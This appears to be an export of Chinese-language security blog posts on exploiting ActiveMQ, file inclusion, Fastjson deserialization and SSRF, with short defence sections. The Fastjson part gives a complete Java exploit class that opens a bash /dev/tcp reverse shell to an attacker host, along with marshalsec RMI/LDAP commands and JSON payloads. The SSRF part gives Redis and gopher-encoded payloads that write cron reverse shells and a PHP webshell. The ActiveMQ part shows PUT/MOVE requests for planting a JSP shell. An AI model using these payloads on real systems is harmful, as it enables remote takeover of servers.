<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过未授权或者弱口令<code>admin/admin</code>登录Apache ActiveMQ</p>
<p>ActiveMQ默认开启PUT请求，当开启PUT时，访问不存在的目录，Response会返回相应的物理路径信息</p>
<p>如果存在未授权或默认口令，以下页面同样可以获取到物理路径</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure>

<p>在 ActiveMQ 5.12.x~5.13.x 版本中，默认关闭 fileserver 目录，可以在<code>conf/jetty.xml</code>中开启；</p>
<p>在5.14.0版本以后，彻底删除了fileserver应用</p>
<p>若服务器存在 fileserver 目录，则可以通过 PUT 请求写入文件</p>
<p>返回204说明上传成功，返回404或者500说明上传失败</p>
<p>但 fileserver 下的文件默认不解析，通过MOVE方法请求移动文件</p>
<p>把文件移动到可以被解析的<code>admin/</code>下或者<code>api/</code>下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/shell.jsp</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>修改<code>conf/jetty.xml</code>文件，<code>bean id</code>为<code>securityConstraint</code>下的<code>authenticate</code>修改值为<code>true</code>，重启服务即可</li>
<li>修改<code>conf/jetty.xml</code>文件，<code>bean id</code> 为<code>securityLoginService</code>下的<code>conf</code>值获取用户properties，修改用户名密码，重启服务即可</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>Apache</category>
        <category>未授权访问漏洞</category>
        <category>ActiveMQ</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache ActiveMQ 未授权访问漏洞 - CVE-2021-26117</title>
    <url>//8ead4fcca5cb.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ActiveMQ 是 Apache 研发的开源消息服务器，它支持Java消息服务、集群、Spring Framework等。</p>
<p>ActiveMQ 是一个完全支持JMS1.1和J2EE 1.4规范的 JMS Provider实现</p>
<p>随着中间件的启动，会打开两个端口，61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口</p>
<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver</p>
<p>其中admin是管理员页面，api是接口，fileserver是储存文件的接口。</p>
<p>admin和api都需要登录后才能访问，fileserver无需登录</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Apache ActiveMQ Artemis &lt; 2.16.0</li>
<li>Apache ActiveMQ &lt; 5.16.1</li>
<li>Apache ActiveMQ &lt; 5.15.14</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>下载地址：<a href="http://activemq.apache.org/components/classic/download/">http://activemq.apache.org/components/classic/download/</a></p>
<p>解压文件夹</p>
<p>启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ActiveMQ/bin/ActiveMQ.bat</span><br><span class="line"></span><br><span class="line">cd ActiveMQ/bin/</span><br><span class="line">./ActiveMQ start</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>端口：61616（工作端口），8161（Web端口）</p>
<p>ActiveMQ LDAP登录模块可被配置为使用匿名访问。在这种情况下，远程攻击者在只提供有效的用户名时，无需提供密码，可造成LDAP未授权访问</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>遍历用户名，通过匿名访问的方式登录</p>
<p>ActiveMQ默认开启PUT请求，当开启PUT时，访问不存在的目录，Response会返回相应的物理路径信息</p>
<p>如果存在未授权或默认口令，以下页面同样可以获取到物理路径</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure>

<p>在 ActiveMQ 5.12.x~5.13.x 版本中，默认关闭 fileserver 目录，可以在<code>conf/jetty.xml</code>中开启；</p>
<p>在5.14.0版本以后，彻底删除了fileserver应用</p>
<p>若服务器存在 fileserver 目录，则可以通过 PUT 请求写入文件</p>
<p>返回204说明上传成功，返回404或者500说明上传失败</p>
<p>但 fileserver 下的文件默认不解析，通过MOVE方法请求移动文件</p>
<p>把文件移动到可以被解析的<code>admin/</code>下或者<code>api/</code>下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/shell.jsp</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将 Apache ActiveMQ 升级为最新版本</li>
<li>禁止在 LDAP 配置中使用匿名绑定</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>Apache</category>
        <category>未授权访问漏洞</category>
        <category>ActiveMQ</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>//c6e96e4efcf5.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>文件包含是指当前脚本文件可通过include等函数，导入其他文件的代码到本文件引发的漏洞。</p>
<p>如果“其他文件”可以是本地文件（本机上的文件）那就是本地文件包含漏洞，如果“其他文件”可以远程文件（其他机器上的文件）那就是远程文件包含漏洞。也就是说这两种漏洞产生的位置是一样的，只是因为利用形式不同才把他们区分开来</p>
<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>本地包含漏洞可以查看本地敏感文件</p>
<p>本地包含漏洞可以配置文件上传漏洞执行恶意代码</p>
<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>远程文件包含漏洞可以包含执行远程主机上的恶意代码</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>文件包含漏洞</category>
      </categories>
      <tags>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化</title>
    <url>//6d3d85286059.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Fastjson是阿里巴巴的开源的 <code>Java JSON</code> 解析库，它可以解析<code>JSON</code>格式的字符串，支持将<code>Java Bean</code> 序列化为 <code>JSON</code> 字符串，也可以从 <code>JSON</code> 字符串反序列化到 <code>JavaBean</code></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><code>Fastjson</code>提供了反序列化功能，允许用户在输入<code>JSON</code>串时通过<code>@type</code>键对应的value指定任意反序列化类名</p>
<p><code>Fastjson</code>自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的<code>setter</code>方法及部分<code>getter</code>方法</p>
<p>那么当组件开启了<code>aototype</code>功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定<code>setter</code>或者<code>getter</code>方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的<code>Gadget</code>），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启<code>autotype</code>功能的绕过。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>&lt;=FastJson 1.2.47</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="RMI模式getshell"><a href="#RMI模式getshell" class="headerlink" title="RMI模式getshell"></a>RMI模式getshell</h3><p>编写代码EXPloit.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成class文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac EXPloit.java</span><br></pre></td></tr></table></figure>

<p>将生成的文件放到web下面</p>
<p>启动一个WEB服务，用于访问EXPloit.class</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p>开启一个RMI监听端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://ip:8080/#Exploit&quot; 9999</span><br></pre></td></tr></table></figure>

<p>NC监听8888端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>burp抓包，通过post请求，发送payload</p>
<p>添加请求头</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">COntent-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>

<p>添加payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://ip:9999/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="LDAP模式getshell"><a href="#LDAP模式getshell" class="headerlink" title="LDAP模式getshell"></a>LDAP模式getshell</h3><p>编写代码EXPloit.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成class文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac EXPloit.java</span><br></pre></td></tr></table></figure>

<p>将生成的文件放到web下面</p>
<p>启动一个WEB服务，用于访问EXPloit.class</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p>开启一个RMI监听端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://ip:8080/#Exploit&quot; 9999</span><br></pre></td></tr></table></figure>

<p>NC监听8888端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>burp抓包，通过post请求，发送payload</p>
<p>添加请求头</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">COntent-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>

<p>添加payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://ip:9999/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>升级FastJson版本</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web应用漏洞</category>
        <category>常规漏洞</category>
        <category>Json</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF服务端请求伪造漏洞</title>
    <url>//239b0b1943ac.html</url>
    <content><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞</p>
<p>SSRF 漏洞的产生原因是服务端提供了能够从其他服务器应用获取数据的功能</p>
<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤限制。</p>
<p>SSRF<strong>利用存在缺陷的Web应用作为代理攻击远程和本地的服务器</strong>。</p>
<p><strong>PHP使用的协议</strong></p>
<table>
<thead>
<tr>
<th align="center">协议</th>
<th align="center">说明</th>
<th align="center">格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">http</td>
<td align="center">web端口访问</td>
<td align="center">url=<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></td>
</tr>
<tr>
<td align="center">https</td>
<td align="center">web端口访问</td>
<td align="center">url=<a href="https://127.0.0.1:8080/">https://127.0.0.1:8080</a></td>
</tr>
<tr>
<td align="center">file</td>
<td align="center">本地文件传输</td>
<td align="center">url=file:///C:/windows/win.ini</td>
</tr>
<tr>
<td align="center">dict</td>
<td align="center">字典协议</td>
<td align="center">url=dict://127.0.0.1:3306</td>
</tr>
<tr>
<td align="center">sftp</td>
<td align="center">SSH文件传输协议</td>
<td align="center">url=s<a href="ftp://test.com:9999/">ftp://test.com:9999/</a> nc -lvp  9999</td>
</tr>
<tr>
<td align="center">tftp</td>
<td align="center">文件传输协议</td>
<td align="center">url=t<a href="ftp://test.com:9999/TESTUDPPACKET">ftp://test.com:9999/TESTUDPPACKET</a> nc -lvp  9999</td>
</tr>
<tr>
<td align="center">ldap</td>
<td align="center">目录访问协议</td>
<td align="center">url=ldap://test.com:9999/%0astats%0aquit nc -lvp  9999</td>
</tr>
<tr>
<td align="center">gopher</td>
<td align="center">分布式文档传递</td>
<td align="center">url=gopher://test.com:9999/_abc nc -lvp  9999</td>
</tr>
</tbody></table>
<p><strong>Java使用的协议</strong></p>
<table>
<thead>
<tr>
<th align="center">协议</th>
<th align="center">说明</th>
<th align="center">格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">http</td>
<td align="center">web端口访问</td>
<td align="center">url=<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></td>
</tr>
<tr>
<td align="center">https</td>
<td align="center">web端口访问</td>
<td align="center">url=<a href="https://127.0.0.1:8080/">https://127.0.0.1:8080</a></td>
</tr>
<tr>
<td align="center">file</td>
<td align="center">本地文件传输</td>
<td align="center">url=file:///C:/windows/win.ini</td>
</tr>
<tr>
<td align="center">ftp</td>
<td align="center">文件传输协议</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">mailto</td>
<td align="center">邮件协议</td>
<td align="center">url=mailto:<a href="mailto:&#120;&#120;&#120;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#109;">&#120;&#120;&#120;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#109;</a>?cc=xxx&amp;body=hello</td>
</tr>
<tr>
<td align="center">netdoc</td>
<td align="center">java自定义通信协议</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">jar</td>
<td align="center">远程解压</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>HTTP,HTTPS协议</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.1:8080</span><br><span class="line"># 在redis写入shell</span><br><span class="line">url=http://127.0.0.1:6379/test</span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.1/9999 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>

<p>FILE协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file:///C:/windows/win.ini</span><br></pre></td></tr></table></figure>

<p>DICT协议</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=dict://127.0.0.1:3306</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line"># dict在redis写入shell,需要对命令进行16进制编码</span><br><span class="line">?url=dict://127.0.0.1:6379/set:shell:&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.1/9999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">?url=dict://127.0.0.1:6379/config:set:dir:/etc/</span><br><span class="line">?url=dict://127.0.0.1:6379/config:set:dbfilename:crontab</span><br><span class="line">?url=dict://127.0.0.1:6379/bgsave</span><br></pre></td></tr></table></figure>

<p>gopher协议</p>
<p>在url中需要二次编码</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=gopher://test.com:9999/_abc</span><br><span class="line">test.com:$ nc -lvp 22</span><br></pre></td></tr></table></figure>

<p>gopher协议通过redis写入shell</p>
<p>在url中需要二次编码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 源指令</span></span><br><span class="line">flushall</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell_sec.php</span><br><span class="line">set &#x27;webshell&#x27; &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 转换指令</span></span><br><span class="line">*1</span><br><span class="line"><span class="meta">$</span><span class="bash">8</span></span><br><span class="line">flushall</span><br><span class="line">*4</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta">$</span><span class="bash">13</span></span><br><span class="line">/var/www/html</span><br><span class="line">*4</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta">$</span><span class="bash">13</span></span><br><span class="line">shell_sec.php</span><br><span class="line">*3</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">8</span></span><br><span class="line">webshell</span><br><span class="line"><span class="meta">$</span><span class="bash">18</span></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">*1</span><br><span class="line"><span class="meta">$</span><span class="bash">4</span></span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一次编码</span></span><br><span class="line">gopher:/127.0.0.1:6379/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%31%33%0d%0a%73%68%65%6c%6c%5f%73%65%63%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span><br></pre></td></tr></table></figure>

<p>gopher协议通过redis写入计划任务</p>
<p>在url中需要二次编码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 源指令</span></span><br><span class="line">flushall</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename shellcrontab</span><br><span class="line">set shell &quot;\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 转换指令</span></span><br><span class="line">*1</span><br><span class="line"><span class="meta">$</span><span class="bash">8</span></span><br><span class="line">flushall</span><br><span class="line">*4</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta">$</span><span class="bash">15</span></span><br><span class="line">/var/spool/cron</span><br><span class="line">*4</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta">$</span><span class="bash">4</span></span><br><span class="line">shellcrontab</span><br><span class="line">*3</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">5</span></span><br><span class="line">shell</span><br><span class="line"><span class="meta">$</span><span class="bash">60</span></span><br><span class="line">\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n</span><br><span class="line">*1</span><br><span class="line"><span class="meta">$</span><span class="bash">4</span></span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一次编码</span></span><br><span class="line">gopher:/127.0.0.1:6379/_*1%0D%0A%248%0D%0Aflushall%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/spool/cron%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Ashellcrontab%0D%0A*3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Ashell%0D%0A%2460%0D%0A%5Cn%5Cn*%20*%20*%20*%20*%20/bin/bash%20-i%3E%26/dev/tcp/192.168.1.1/8888%200%3E%261%5Cn%5Cn%0D%0A*1%0D%0A%244%0D%0Asave</span><br></pre></td></tr></table></figure>



<p>其他协议</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?url=sftp://test.com:9999/</span><br><span class="line">?url=dict://test.com:9999/</span><br><span class="line">?url=tftp://test.com:9999/TESTUDPPACKET/</span><br><span class="line">?url=ldap://test.com:9999/%0astats%0aquit</span><br><span class="line">?url=gopher://test.com:9999/_abc</span><br><span class="line"></span><br><span class="line">test.com:$ nc -lvp 22</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><ul>
<li>分享：通过URL地址分享网页内容</li>
<li>转码服务（手机适配）</li>
<li>在线翻译（在翻译页面输入URL）</li>
<li>图片的加载与下载</li>
<li>图片，文章收藏功能</li>
<li>未公开的API实现以及其他调用URL的功能</li>
<li>邮件系统</li>
<li>网站采集</li>
<li>编码处理</li>
<li>从URL关键字中寻找<ul>
<li>share</li>
<li>wap</li>
<li>url</li>
<li>link</li>
<li>src</li>
<li>source</li>
<li>target</li>
<li>u</li>
<li>3g</li>
<li>display</li>
<li>sourceURL</li>
<li>image</li>
<li>imageURL</li>
<li>domain</li>
<li>……</li>
</ul>
</li>
</ul>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p> 查找访问的资源地址，如果该地址类型为<code>http://xxx.com/x?image=xxx</code></p>
<p>就可能存在SSRF漏洞</p>
<p>将xxx改为内网地址，如果返回1xx,2xx，说明改地址是存在的</p>
